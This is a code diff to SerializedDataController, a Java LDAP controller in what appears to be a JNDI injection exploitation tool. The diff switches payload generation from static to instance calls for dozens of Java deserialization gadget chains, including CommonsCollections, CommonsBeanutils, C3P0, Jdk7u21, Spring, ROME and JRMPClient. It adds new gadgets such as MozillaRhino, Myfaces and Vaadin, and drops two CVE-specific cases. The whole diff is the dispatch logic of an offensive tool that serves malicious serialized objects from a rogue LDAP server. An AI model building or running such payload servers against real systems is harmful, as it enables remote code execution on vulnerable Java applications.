@@ -32,149 +32,232 @@ public class SerializedDataController implements LdapController {
                 bytes = URLDNS.getBytes(params[0]);
                 break;
             case commonsbeanutils1:
-                bytes = CommonsBeanutils1.getBytes(payloadType, params);
+                CommonsBeanutils1 commonsBeanutils1 = new CommonsBeanutils1();
+                bytes = commonsBeanutils1.getBytes(payloadType, params);
                 break;
             case commonsbeanutils2:
-                bytes = CommonsBeanutils2.getBytes(payloadType, params);
+                CommonsBeanutils2 commonsBeanutils2 = new CommonsBeanutils2();
+                bytes = commonsBeanutils2.getBytes(payloadType, params);
                 break;
             case commonsbeanutils3:
-                bytes = CommonsBeanutils3.getBytes(payloadType);
+                CommonsBeanutils3 commonsBeanutils3 = new CommonsBeanutils3();
+                bytes = commonsBeanutils3.getBytes(payloadType, params);
+                break;
+            case commonsbeanutils4:
+                CommonsBeanutils4 commonsBeanutils4 = new CommonsBeanutils4();
+                bytes = commonsBeanutils4.getBytes(payloadType, params);
                 break;
             case commonsbeanutils2nocc:
-                bytes = CommonsBeanutils2NOCC.getBytes(payloadType, params);
+                CommonsBeanutils2NOCC commonsBeanutils2NOCC = new CommonsBeanutils2NOCC();
+                bytes = commonsBeanutils2NOCC.getBytes(payloadType, params);
                 break;
             case commonsbeanutils3183:
-                bytes = CommonsBeanutils3183.getBytes(payloadType);
+                CommonsBeanutils3183 commonsBeanutils3183 = new CommonsBeanutils3183();
+                bytes = commonsBeanutils3183.getBytes(payloadType, params);
                 break;
             case commonsbeanutils1183nocc:
-                bytes = CommonsBeanutils1183NOCC.getBytes(payloadType, params);
+                CommonsBeanutils1183NOCC commonsBeanutils1183NOCC = new CommonsBeanutils1183NOCC();
+                bytes = commonsBeanutils1183NOCC.getBytes(payloadType, params);
                 break;
             case commonscollections1:
-                bytes = CommonsCollections1.getBytes(payloadType);
-                break;
-            case commonscollections1_1:
-                bytes = CommonsCollections1_1.getBytes(payloadType);
+                CommonsCollections1 commonsCollections1 = new CommonsCollections1();
+                bytes = commonsCollections1.getBytes(payloadType, params);
                 break;
             case commonscollections2:
-                bytes = CommonsCollections2.getBytes(payloadType, params);
+                CommonsCollections2 commonsCollections2 = new CommonsCollections2();
+                bytes = commonsCollections2.getBytes(payloadType, params);
                 break;
             case commonscollections3:
-                bytes = CommonsCollections3.getBytes(payloadType, params);
+                CommonsCollections3 commonsCollections3 = new CommonsCollections3();
+                bytes = commonsCollections3.getBytes(payloadType, params);
                 break;
             case commonscollections4:
-                bytes = CommonsCollections4.getBytes(payloadType, params);
+                CommonsCollections4 commonsCollections4 = new CommonsCollections4();
+                bytes = commonsCollections4.getBytes(payloadType, params);
                 break;
             case commonscollections5:
-                bytes = CommonsCollections5.getBytes(payloadType);
+                CommonsCollections5 commonsCollections5 = new CommonsCollections5();
+                bytes = commonsCollections5.getBytes(payloadType, params);
                 break;
             case commonscollections6:
-                bytes = CommonsCollections6.getBytes(payloadType);
+                CommonsCollections6 cc6 = new CommonsCollections6();
+                bytes = cc6.getBytes(payloadType, params);
                 break;
             case commonscollections7:
-                bytes = CommonsCollections7.getBytes(payloadType);
+                CommonsCollections7 commonsCollections7 = new CommonsCollections7();
+                bytes = commonsCollections7.getBytes(payloadType, params);
                 break;
             case commonscollections7lite_4:
-                bytes = CommonsCollections7Lite.getBytes(payloadType);
+                CommonsCollections7Lite CommonsCollections7Lite = new CommonsCollections7Lite();
+                bytes = CommonsCollections7Lite.getBytes(payloadType, params);
                 break;
             case commonscollections8:
-                bytes = CommonsCollections8.getBytes(payloadType, params);
+                CommonsCollections8 cc8 = new CommonsCollections8();
+                bytes = cc8.getBytes(payloadType, params);
                 break;
             case commonscollections9:
-                bytes = CommonsCollections9.getBytes(payloadType);
+                CommonsCollections9 cc9 = new CommonsCollections9();
+                bytes = cc9.getBytes(payloadType, params);
                 break;
             case commonscollections10:
-                bytes = CommonsCollections10.getBytes(payloadType, params);
+                CommonsCollections10 cc10 = new CommonsCollections10();
+                bytes = cc10.getBytes(payloadType, params);
                 break;
             case commonscollectionsk1:
-                bytes = CommonsCollectionsK1.getBytes(payloadType, params);
+                CommonsCollectionsK1 ccK1 = new CommonsCollectionsK1();
+                bytes = ccK1.getBytes(payloadType, params);
                 break;
             case commonscollectionsk2:
-                bytes = CommonsCollectionsK2.getBytes(payloadType, params);
+                CommonsCollectionsK2 ccK2 = new CommonsCollectionsK2();
+                bytes = ccK2.getBytes(payloadType, params);
                 break;
             case commonscollections6lite:
-                bytes = CommonsCollections6Lite.getBytes(payloadType, params);
+                CommonsCollections6Lite CC6Lite = new CommonsCollections6Lite();
+                bytes = CC6Lite.getBytes(payloadType, params);
                 break;
             case commonscollections6lite_4:
-                bytes = CommonsCollections6Lite_4.getBytes(payloadType);
+                CommonsCollections6Lite_4 commonsCollections6Lite_4 = new CommonsCollections6Lite_4();
+                bytes = commonsCollections6Lite_4.getBytes(payloadType, params);
                 break;
             case jdk7u21:
+                Jdk7u21 Jdk7u21 = new Jdk7u21();
                 bytes = Jdk7u21.getBytes(payloadType, params);
                 break;
             case jre8u20:
+                Jre8u20 Jre8u20 = new Jre8u20();
                 bytes = Jre8u20.getBytes(payloadType, params);
                 break;
             case c3p0:
-                bytes = C3P0.getBytes(payloadType);
+                C3P0 c3P0 = new C3P0();
+                bytes = c3P0.getBytes(payloadType, params);
                 break;
             case c3p02:
-                bytes = C3P02.getBytes(payloadType);
+                C3P02 c3P02 = new C3P02();
+                bytes = c3P02.getBytes(payloadType, params);
                 break;
             case c3p03:
-                bytes = C3P03.getBytes(payloadType);
+                C3P03 c3P03 = new C3P03();
+                bytes = c3P03.getBytes(payloadType, params);
                 break;
             case c3p04:
-                bytes = C3P04.getBytes(payloadType);
+                C3P04 c3P04 = new C3P04();
+                bytes = c3P04.getBytes(payloadType, params);
                 break;
             case signedobject:
                 SignedObject signedObject = new SignedObject();
-                bytes = signedObject.getBytes(payloadType);
+                bytes = signedObject.getBytes(payloadType, params);
                 break;
             case aspectjweaver:
-                bytes = AspectJWeaver.getBytes(payloadType);
+                AspectJWeaver aspectJWeaver = new AspectJWeaver();
+                bytes = aspectJWeaver.getBytes(payloadType, params);
                 break;
             case beanshell1:
-                bytes = BeanShell1.getBytes(payloadType);
+                BeanShell1 beanShell1 = new BeanShell1();
+                bytes = beanShell1.getBytes(payloadType, params);
                 break;
             case c3p092:
-                bytes = C3P092.getBytes(payloadType);
+                C3P092 c3P092 = new C3P092();
+                bytes = c3P092.getBytes(payloadType, params);
                 break;
             case click1:
-                bytes = Click1.getBytes(payloadType, params);
+                Click1 click1 = new Click1();
+                bytes = click1.getBytes(payloadType, params);
                 break;
             case clojure:
-                bytes = Clojure.getBytes(payloadType);
-                break;
-            case cve_2020_2555:
-                bytes = CVE_2020_2555.getBytes(payloadType, params);
-                break;
-            case cve_2020_2883:
-                bytes = CVE_2020_2883.getBytes(payloadType, params);
+                Clojure clojure = new Clojure();
+                bytes = clojure.getBytes(payloadType, params);
                 break;
             case jython1:
-                bytes = Jython1.getBytes(payloadType);
+                Jython1 Jython1 = new Jython1();
+                bytes = Jython1.getBytes(payloadType, params);
                 break;
             case json:
+                JSON1 JSON1 = new JSON1();
                 bytes = JSON1.getBytes(payloadType, params);
                 break;
             case groovy1:
-                bytes = Groovy1.getBytes(payloadType);
+                Groovy1 Groovy1 = new Groovy1();
+                bytes = Groovy1.getBytes(payloadType, params);
                 break;
             case hibernate1:
+                Hibernate1 Hibernate1 = new Hibernate1();
                 bytes = Hibernate1.getBytes(payloadType, params);
                 break;
             case hibernate2:
-                bytes = Hibernate2.getBytes(payloadType);
+                Hibernate2 Hibernate2 = new Hibernate2();
+                bytes = Hibernate2.getBytes(payloadType, params);
                 break;
             case javassistweld1:
+                JavassistWeld1 JavassistWeld1 = new JavassistWeld1();
                 bytes = JavassistWeld1.getBytes(payloadType, params);
                 break;
             case jbossinterceptors1:
+                JBossInterceptors1 JBossInterceptors1 = new JBossInterceptors1();
                 bytes = JBossInterceptors1.getBytes(payloadType, params);
                 break;
             case jdk7u21variant:
+                Jdk7u21variant Jdk7u21variant = new Jdk7u21variant();
                 bytes = Jdk7u21variant.getBytes(payloadType, params);
                 break;
             case jrmpclient:
-                bytes = JRMPClient.getBytes(payloadType);
+                JRMPClient JRMPClient = new JRMPClient();
+                bytes = JRMPClient.getBytes(payloadType, params);
                 break;
             case jrmpclient_activator:
-                bytes = JRMPClient_Activator.getBytes(payloadType);
+                JRMPClient_Activator JRMPClient_Activator = new JRMPClient_Activator();
+                bytes = JRMPClient_Activator.getBytes(payloadType, params);
                 break;
             case jrmpclient_obj:
-                bytes = JRMPClient_Obj.getBytes(payloadType);
+                JRMPClient_Obj JRMPClient_Obj = new JRMPClient_Obj();
+                bytes = JRMPClient_Obj.getBytes(payloadType, params);
                 break;
             case jrmplistener:
-                bytes = JRMPListener.getBytes(payloadType);
+                JRMPListener JRMPListener = new JRMPListener();
+                bytes = JRMPListener.getBytes(payloadType, params);
+                break;
+            case mozillarhino1:
+                MozillaRhino1 MozillaRhino1 = new MozillaRhino1();
+                bytes = MozillaRhino1.getBytes(payloadType, params);
+                break;
+            case mozillarhino2:
+                MozillaRhino2 MozillaRhino2 = new MozillaRhino2();
+                bytes = MozillaRhino2.getBytes(payloadType, params);
+                break;
+            case myfaces1:
+                Myfaces1 Myfaces1 = new Myfaces1();
+                bytes = Myfaces1.getBytes(payloadType, params);
+                break;
+            case myfaces2:
+                Myfaces2 Myfaces2 = new Myfaces2();
+                bytes = Myfaces2.getBytes(payloadType, params);
+                break;
+            case renderedimage:
+                RenderedImage RenderedImage = new RenderedImage();
+                bytes = RenderedImage.getBytes(payloadType, params);
+                break;
+            case rome:
+                ROME ROME = new ROME();
+                bytes = ROME.getBytes(payloadType, params);
+                break;
+            case rome2:
+                ROME2 ROME2 = new ROME2();
+                bytes = ROME2.getBytes(payloadType, params);
+                break;
+            case spring1:
+                Spring1 Spring1 = new Spring1();
+                bytes = Spring1.getBytes(payloadType, params);
+                break;
+            case spring2:
+                Spring2 Spring2 = new Spring2();
+                bytes = Spring2.getBytes(payloadType, params);
+                break;
+            case spring3:
+                Spring3 Spring3 = new Spring3();
+                bytes = Spring3.getBytes(payloadType, params);
+                break;
+            case vaadin1:
+                Vaadin1 Vaadin1 = new Vaadin1();
+                bytes = Vaadin1.getBytes(payloadType, params);
                 break;
         }
 
